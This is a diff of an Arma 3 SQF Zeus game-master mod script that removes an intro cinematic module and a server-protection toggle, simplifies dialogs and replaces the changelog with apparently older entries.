-					cutText ["", "BLACK IN", 2];
-					[1, 2, true, true] call BIS_fnc_cinemaBorder;
-					if(_zeus) then {
-						sleep 0.2;
-						openCuratorInterface;
-					};
-				};
-				[[_target],HYPER_fnc_remoteCamera] remoteExec ["spawn", _allPlayers];
-			};
-		};
-
-		HYPER_EZM_fnc_introCinematicModule = {
-			params ["_entity"];
-			private _target = [true] call MAZ_EZM_fnc_getScreenPosition;
-			private _dialogTitle = "Intro Cinematic";
-			private _content = [
-				[
-					"COMBO",
-					"Cinematic Type",
-					[
-						["Flyby"],
-						["Flyby"],
-						0
-					]
-				],
-				[
-					"COMBO",
-					"Background Song",
-					[
-						["random", "epic", "action", "stealth"],
-						["Random Event Track", "Epic", "Action", "Stealth"],
-						0
-					]
-				],
-				[
-					"EDIT",
-					"Intertitle 1",
-					[
-						"",
-						1
-					]
-				],
-				[
-					"EDIT",
-					"Intertitle 2",
-					[
-						"",
-						1
-					]
-				],
-				[
-					"TOOLBOX:YESNO",
-					["Zeus Can See Cutscene?","Zeus player may experience a small lag spike when cutscene ends."],
-					[false]
-				],
-				[
-					"COMBO",
-					"Post-Process Filter",
-					[
-						["none", "highcontrast", "blue", "dull", "yellowgamma", "greengamma"],
-						["None", "High Contrast", "Blue", "Dull", "Yellow Gamma", "Green Gamma"],
-						0
-					]
-				]
-			];
-			private _onConfirm = {
-				params ["_values", "_args", "_display"];
-				_values params ["_cinematicType","_backgroundSong","_text1","_text2","_zeusCanSeeCutscene","_postProcess"];
-				private _target = _args # 0;
-				private _intertitles = [_text1,_text2];
-				[_cinematicType, _backgroundSong, _intertitles, _zeusCanSeeCutscene, _postProcess, _target] spawn HYPER_EZM_fnc_handleIntroCinematic;
-				_display closeDisplay 1;
-			};
-			private _onCancel = {
-				params ["_values", "_args", "_display"];
-				_display closeDisplay 2;
-			};
-			[
-				_dialogTitle,
-				_content,
-				_onConfirm,
-				_onCancel,
-				[_target]
-			] call MAZ_EZM_fnc_createDialog;
-			
-		};
-
-		comment "TODO: remove cinematic bars module that also un-blacks out screen";
-
 	comment "AI Supports";
 
 		MAZ_EZM_fnc_airDropSupportModule = {
-			params ["_pos","_mode","_aioArsenal","_direction","_vehType","_sideOf","_sfx"];
+			params ["_pos","_mode","_direction","_vehType","_sideOf","_sfx"];
 			private ["_typeMode","_dropType","_dropLoad","_dir","_vehPos","_doorAnim"];
 			private _typeMode = _mode select 0; _dropType = nil; if(count _mode == 2) then {_dropType = _mode select 1;};
 			_typeMode = toLower _typeMode; if(count _mode == 2) then {_dropType = toLower _dropType;}; _vehType = toLower _vehType;
@@ -6490,7 +6055,7 @@ MAZ_EZM_fnc_initFunction = {
 						case "RadioAmbient6": {playSound _radioChatter; sleep 6; playSound "RadioAmbient2";};
 						case "RadioAmbient8": {playSound _radioChatter;};
 					};
-				}] remoteExec ['spawn',0];
+				}] remoteExec ["spawn",_sideOf];
 			};
 
 			private _wayPointMove = _grp addWaypoint [[(_pos select 0),(_pos select 1),300],0];
@@ -6524,7 +6089,7 @@ MAZ_EZM_fnc_initFunction = {
 						case "RadioAmbient6": {playSound _radioChatter; sleep 6; playSound "RadioAmbient2";};
 						case "RadioAmbient8": {playSound _radioChatter;};
 					};
-				}] remoteExec ['spawn',0];
+				}] remoteExec ['spawn',_sideof];
 			};
 
 			private _dropPos = position _spawnedVeh getPos [10,getDir _spawnedVeh+180];
@@ -6545,11 +6110,7 @@ MAZ_EZM_fnc_initFunction = {
 			detach _smoke;
 			detach _light;
 			if(_mode select 0 == 'arsenal') then {
-				if(_aioArsenal) then {
-					[_veh,nil,true,false,false] call JAM_EZM_fnc_createAIOArsenalModule;
-				} else {
-					["AmmoboxInit",[_veh,true]] spawn BIS_fnc_arsenal;
-				};
+				[_veh,nil,true,false,false] call JAM_EZM_fnc_createAIOArsenalModule;
 			};
 			if(_vehType == 'B_Heli_Transport_03_F') then {
 				sleep 20;
@@ -6571,12 +6132,7 @@ MAZ_EZM_fnc_initFunction = {
 				[
 					"TOOLBOX",
 					"Airdrop Type",
-					[false,["Arsenal","Vehicle"]],
-					{true},
-					{
-						params ["_display","_value"];
-						_display setVariable ["MAZ_EZM_isVehicle",_value];
-					}
+					[false,["Arsenal","Vehicle"]]
 				],
 				[
 					"LIST",
@@ -6611,20 +6167,7 @@ MAZ_EZM_fnc_initFunction = {
 							"FV-720 Mora"
 						],
 						0
-					],
-					{
-						params ["_display"];
-						_display getVariable "MAZ_EZM_isVehicle";
-					}
-				],
-				[
-					"TOOLBOX:YESNO",
-					"AIO Arsenal?",
-					[true],
-					{
-						params ["_display"];
-						!(_display getVariable "MAZ_EZM_isVehicle");
-					}
+					]
 				],
 				[
 					"LIST",
@@ -6657,7 +6200,7 @@ MAZ_EZM_fnc_initFunction = {
 				]
 			],{
 				params ["_values","_args","_display"];
-				_values params ["_type","_payloadType","_aioArsenal","_dir","_aircraft","_side","_radioSFX"];
+				_values params ["_type","_payloadType","_dir","_aircraft","_side","_radioSFX"];
 
 				private _typeArray = [];
 				if(_type) then {
@@ -6693,18 +6236,12 @@ MAZ_EZM_fnc_initFunction = {
 					_typeArray pushBack 'Arsenal';
 				};
 
-				[_args,_typeArray,_aioArsenal,_dir,_aircraft,_side,_radioSFX] spawn MAZ_EZM_fnc_airDropSupportModule; 
+				[_args,_typeArray,_dir,_aircraft,_side,_radioSFX] spawn MAZ_EZM_fnc_airDropSupportModule; 
 				_display closeDisplay 1;
 			},{
 				params ["_values","_args","_display"];
 				_display closeDisplay 2;
-			},
-			[true] call MAZ_EZM_fnc_getScreenPosition,
-			{
-				params ["_display"];
-				_display setVariable ["MAZ_EZM_isVehicle",false];
-			}
-			] call MAZ_EZM_fnc_createDialog;
+			},[true] call MAZ_EZM_fnc_getScreenPosition] call MAZ_EZM_fnc_createDialog;
 		};
 
 		MAZ_EZM_fnc_heliEvacExec = {
@@ -6943,7 +6480,7 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_values","_pos","_display"];
 				_values params ["_directionIndex","_side","_helicopterType","_numToLeave"];
 				_display closeDisplay 1;
-				private _dir = switch (parseNumber _directionIndex) do {
+				private _dir = switch (_directionIndex) do {
 					case 0: {'North'};
 					case 1: {'South'};
 					case 2: {'East'};
@@ -6970,7 +6507,7 @@ MAZ_EZM_fnc_initFunction = {
 			private _fnc_processParams = {
 				params ["_pos","_side","_groupType","_dir","_endPos"];
 				private _factionData = [_side] call MAZ_EZM_fnc_getAllFactionGroups;
-				private _groupCfg = [_factionData,parseNumber _groupType] call MAZ_EZM_fnc_getGroupDataFromIndex;
+				private _groupCfg = [_factionData,_groupType] call MAZ_EZM_fnc_getGroupDataFromIndex;
 				_side = switch (getNumber(_groupCfg >> "side")) do {
 					case 0: {east};
 					case 1: {west};
@@ -6981,7 +6518,7 @@ MAZ_EZM_fnc_initFunction = {
 					case east: {"O_Heli_Light_02_unarmed_F"};
 					case independent: {"I_Heli_Transport_02_F"};
 				};
-				_dir = switch (parseNumber _dir) do {
+				_dir = switch (_dir) do {
 					case 0: {0};
 					case 1: {180};
 					case 2: {90};
@@ -6999,7 +6536,7 @@ MAZ_EZM_fnc_initFunction = {
 
 			waitUntil{!isNull driver _spawnedVeh};
 			_grp setBehaviour "CARELESS";
-			[_spawnedVeh,2] remoteExec ['lock'];
+			_spawnedVeh lock 2;
 
 			private _heliParams = switch (_heliType) do {
 				case "B_Heli_Transport_01_F": {
@@ -7022,7 +6559,6 @@ MAZ_EZM_fnc_initFunction = {
 			}forEach _units;
 
 			private _heliPad1 = "Land_HelipadEmpty_F" createVehicle _pos;
-			_heliPad1 setPos _pos;
 			private _waypointPickup = _grp addWaypoint [position _heliPad1,0];
 			_waypointPickup setWaypointType "TR UNLOAD";
 
@@ -7146,8 +6682,8 @@ MAZ_EZM_fnc_initFunction = {
 			],{
 				params ["_values","_pos","_display"];
 				_values params ["_side","_dir"];
-				[_side,_dir] spawn MAZ_EZM_fnc_callReinforcementsChooseGroup;
 				_display closeDisplay 1;
+				[_side,_dir] spawn MAZ_EZM_fnc_callReinforcementsChooseGroup;
 			},{
 				params ["_values","_args","_display"];
 				_display closeDisplay 2;
@@ -7181,11 +6717,10 @@ MAZ_EZM_fnc_initFunction = {
 				
 				private _reinforcementsParams = [_pos,_side,_groupType,_dir,[]];
 				private _helipadMarker = createVehicle ["Land_HelipadEmpty_F",_pos,[],0,"CAN_COLLIDE"];
-				_helipadMarker setPosATL _pos;
 
 				["Reinforcements Destination on Foot",{
 					params ["_objects","_position","_args","_shift","_ctrl","_alt"];
-					deleteVehicle _objects;
+					deleteVehicle _units;
 					_args set [4,_position];
 					_args spawn MAZ_EZM_fnc_spawnReinforcements;
 				},_helipadMarker,_reinforcementsParams] call MAZ_EZM_fnc_selectSecondaryPosition;
@@ -9863,45 +9398,54 @@ MAZ_EZM_fnc_initFunction = {
 			private _strings = []; 
 			private _start = -1; 
 			
-			while {_start = _input find "//"; _start > -1} do {
-				_input select [0, _start] call {
-					private _badQuotes = _this call { 
-						private _qtsGood = []; 
-						private _qtsInfo = []; 
-						private _arr = toArray _this; 
-						
-						{ 
-							_qtsGood pushBack ((count _arr - count (_arr - [_x])) % 2 == 0); 
-							_qtsInfo pushBack [_this find toString [_x], _x]; 
-						}forEach [34, 39]; 
-							
-						if (_qtsGood isEqualTo [true, true]) exitWith {0}; 
-							
-						_qtsInfo sort true; 
-						_qtsInfo select 0 select 1 
-					}; 
+			while {_start = _input find "//"; _start > -1} do  
+			{  
+			_input select [0, _start] call 
+			{ 
+			private _badQuotes = _this call  
+			{ 
+			private _qtsGood = []; 
+			private _qtsInfo = []; 
+			private _arr = toArray _this; 
 				
-					if (_badQuotes > 0) exitWith {  
-						_last = _input select [_start] find toString [_badQuotes]; 
-							
-						if (_last < 0) exitWith  
-						{ 
-							_strings = [_input]; 
-							_input = ""; 
-						}; 
-							
-						_last = _start + _last + 1; 
-						_strings pushBack (_input select [0, _last]); 
-						
-						_input = _input select [_last]; 
-					}; 
+			{ 
+				_qtsGood pushBack ((count _arr - count (_arr - [_x])) % 2 == 0); 
+				_qtsInfo pushBack [_this find toString [_x], _x]; 
+			}  
+			forEach [34, 39]; 
 				
-					_strings pushBack _this; 
-					_input = _input select [_start]; 
-					private _end = _input find toString [10]; 
-					if (_end < 0) exitWith {_input = ""}; 
-					_input = _input select [_end + 1]; 
-				}; 
+			if (_qtsGood isEqualTo [true, true]) exitWith {0}; 
+				
+			_qtsInfo sort true; 
+			_qtsInfo select 0 select 1 
+			}; 
+		
+			if (_badQuotes > 0) exitWith 
+			{  
+			_last = _input select [_start] find toString [_badQuotes]; 
+				
+			if (_last < 0) exitWith  
+			{ 
+				_strings = [_input]; 
+				_input = ""; 
+			}; 
+				
+			_last = _start + _last + 1; 
+			_strings pushBack (_input select [0, _last]); 
+			
+			_input = _input select [_last]; 
+			}; 
+		
+			_strings pushBack _this; 
+			
+			_input = _input select [_start]; 
+			
+			private _end = _input find toString [10]; 
+			
+			if (_end < 0) exitWith {_input = ""}; 
+			
+			_input = _input select [_end + 1]; 
+			}; 
 			}; 
 			
 			_input = (_strings joinString "") + _input; 
@@ -10405,7 +9949,7 @@ MAZ_EZM_fnc_initFunction = {
 					]
 				],
 				[
-					"SLIDER",
+					"SLIDER:RADIUS",
 					"IED Explosive Radius",
 					[3,15,7,_pos,[1,0,0,1]]
 				],
@@ -10417,14 +9961,13 @@ MAZ_EZM_fnc_initFunction = {
 			],{
 				params ["_values","_pos","_display"];
 				_values params ["_iedType","_radius","_sides"];
-				systemChat (str _values);
 				private _trashCanTypes = ["Land_GarbageBin_01_F","TrashBagHolder_01_F"];
 				private _cardboardBox = ["Land_PaperBox_01_small_destroyed_brown_F"];
 				private _luggageTypes = ["Land_LuggageHeap_01_F","Land_LuggageHeap_03_F"];
 				private _barrelTypes = ["Land_MetalBarrel_empty_F","Land_BarrelEmpty_grey_F","Land_BarrelEmpty_F"];
 				private _vehicleWreckTypes = ["Land_Wreck_Skodovka_F","Land_Wreck_CarDismantled_F","Land_Wreck_Truck_F","Land_Wreck_Van_F","Land_Wreck_Offroad_F","Land_Wreck_Truck_dropSide_F","Land_Wreck_Offroad2_F","Land_Wreck_Car3_F","Land_Wreck_Car_F","Land_Wreck_Car2_F"];
 
-				_iedType = switch (parseNumber _iedType) do {
+				_iedType = switch (_iedType) do {
 					case 0: {selectRandom _cardboardBox};
 					case 1: {selectRandom _luggageTypes};
 					case 2: {selectRandom _trashCanTypes};
@@ -10657,7 +10200,7 @@ MAZ_EZM_fnc_initFunction = {
 					[
 						0,
 						1,
-						markerAlpha _marker,
+						1,
 						objNull,
 						[1,1,1,1],
 						true
@@ -10797,7 +10340,7 @@ MAZ_EZM_fnc_initFunction = {
 
 		MAZ_EZM_fnc_3DSpeakModule = {
 			params ["_entity"];
-			if (isNull _entity) exitWith {["Place this module onto a unit!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
+			if (isNull _object) exitWith {["Place this module onto a unit!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 			[
 				"3D Speak Message",
 				[
@@ -11638,32 +11181,6 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_values","_args","_display"];
 				_display closeDisplay 2;
 			},[]] call MAZ_EZM_fnc_createDialog;
-		};
-
-		MAZ_EZM_fnc_toggleServerProtections = {
-			[
-				"TOGGLE SERVER PROTECTIONS",
-				[
-					[
-						"TOOLBOX:ENABLED",
-						"Enable Server Protections?",
-						[
-							missionNamespace getVariable ["MAZ_EZM_ServerProtection",true]
-						]
-					]
-				],
-				{
-					params ["_values","_args","_display"];
-					missionNamespace setVariable ["MAZ_EZM_ServerProtection",(_values # 0),true];
-					[["Server Protection System disabled.","Server Protection System enabled."] select (_values # 0),"addItemOk"] call MAZ_EZM_fnc_systemMessage;
-					_display closeDisplay 1;
-				},
-				{
-					params ["_values","_args","_display"];
-					_display closeDisplay 2;
-				},
-				[]
-			] call MAZ_EZM_fnc_createDialog;
 		};
 
 	comment "Sounds";
@@ -13802,7 +13319,7 @@ MAZ_EZM_fnc_initFunction = {
 				[
 					"TOOLBOX",
 					"Disable Game Mod?",
-					[missionNamespace getVariable ["MAZ_EZM_disableModerator",true],[["No, enable","Enables Game Moderator Rights."],["Yes, disable","Removes Game Moderator rights."]]]
+					[true,[["No, enable","Enables Game Moderator Rights."],["Yes, disable","Removes Game Moderator rights."]]]
 				]
 			],{
 				params ["_values","_args","_display"];
@@ -16297,22 +15814,6 @@ MAZ_EZM_fnc_editZeusInterface = {
 					"a3\3den\data\displays\display3den\toolbar\undo_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
 
-			comment "Cinematics";
-				MAZ_Cinematics = [
-					MAZ_zeusModulesTree,
-					"Cinematics",
-					"a3\ui_f\data\gui\cfg\keyframeanimation\iconcamera_ca.paa"
-				] call MAZ_EZM_fnc_zeusAddCategory;
-
-				[
-					MAZ_zeusModulesTree,
-					MAZ_Cinematics,
-					"Intro Cinematic",
-					"Create an exciting cinematic introduction to your missions (by bijx)",
-					"HYPER_EZM_fnc_introCinematicModule",
-					"a3\ui_f\data\igui\cfg\islandmap\iconcamera_ca.paa"
-				] call MAZ_EZM_fnc_zeusAddModule;
-
 			comment "Clean Up Stuff";
 				MAZ_CleanUpTree = [
 					MAZ_zeusModulesTree,
@@ -16861,15 +16362,6 @@ MAZ_EZM_fnc_editZeusInterface = {
 					"Removes the Team-Killer status from all players.",
 					"MAZ_EZM_fnc_noTeamKillersModule",
 					"a3\ui_f_curator\data\cfgmarkers\kia_ca.paa"
-				] call MAZ_EZM_fnc_zeusAddModule;
-
-				[
-					MAZ_zeusModulesTree,
-					MAZ_ServerSettingsTree,
-					"Toggle Server Protections",
-					"Prevents known trolls and malicious scripters from joining the server.\nAlerts Zeus if an unauthorized person has access to Zeus.",
-					"MAZ_EZM_fnc_toggleServerProtections",
-					"a3\ui_f\data\igui\cfg\holdactions\holdaction_secure_ca.paa"
 				] call MAZ_EZM_fnc_zeusAddModule;
 
 			comment "Sounds";
@@ -17925,10 +17417,17 @@ if(isNil "MAZ_EZM_shamelesslyPlugged") then {
 };
 
 private _changelog = [
-	"Added first iteration of Cinematics modules - Thanks Bijx",
-	"Changed the Dialog system to have conditions and onChanged events",
-	"Changed the Dialog system to have increased performance, speeding up loading",
-	"Fixed issues where dynamic modules would be removed if the player ran EZM again"
+	"Changed Auto Cleaner to run on the server so that the bodies get deleted even after the Zeus who placed them leaves",
+	"Changed Mortar Area to do a ranging round first with a delay of 5-10 seconds before the main barrage",
+	"Fixed Suppressive Fire to actually work",
+	"Fixed vehicle attributes not applying",
+	"Fixed unit skill percentage showing up with an insane amount of decimals",
+	"Fixed the Auto Cleaner not deleting dead bodies",
+	"Fixed God Mode fences would remove gates",
+	"Fixed aircraft carrier module wouldn't delete bad carriers",
+	"Fixed issue with the Create Zeus Unit bugging Zeuses out of their interface",
+	"Removed AVG FPS function. Was almost setting Bohemia servers on fire",
+	"Did a remoteExec audit, hopefully pleasing Dwarden and sparing the Bohemia server logs"
 ];
 
 private _changelogString = "";
@@ -17945,21 +17444,12 @@ private _changelogString = "";
 	[
 		"TOOLBOX:YESNO",
 		["Join a Side Channel?","Whether you will be set as a certain side and be able to hear their side chat."],
-		[true],
-		{true},
-		{
-			params ["_display","_value"];
-			_display setVariable ["MAZ_EZM_showSides",_value];
-		}
+		[true]
 	],
 	[
 		"SIDES",
 		"Side to Join",
-		west,
-		{
-			params ["_display"];
-			_display getVariable ["MAZ_EZM_showSides",true];
-		}
+		west
 	],
 	[
 		"EDIT:MULTI",
@@ -17987,10 +17477,7 @@ private _changelogString = "";
 },{
 	params ["_values","_args","_display"];
 	_display closeDisplay 2;
-},[],{
-	params ["_display"];
-	_display setVariable ["MAZ_EZM_showSides",true];
-}] call MAZ_EZM_fnc_createDialog;
+},[]] call MAZ_EZM_fnc_createDialog;
 
 comment "
 	TODO Expung3d:
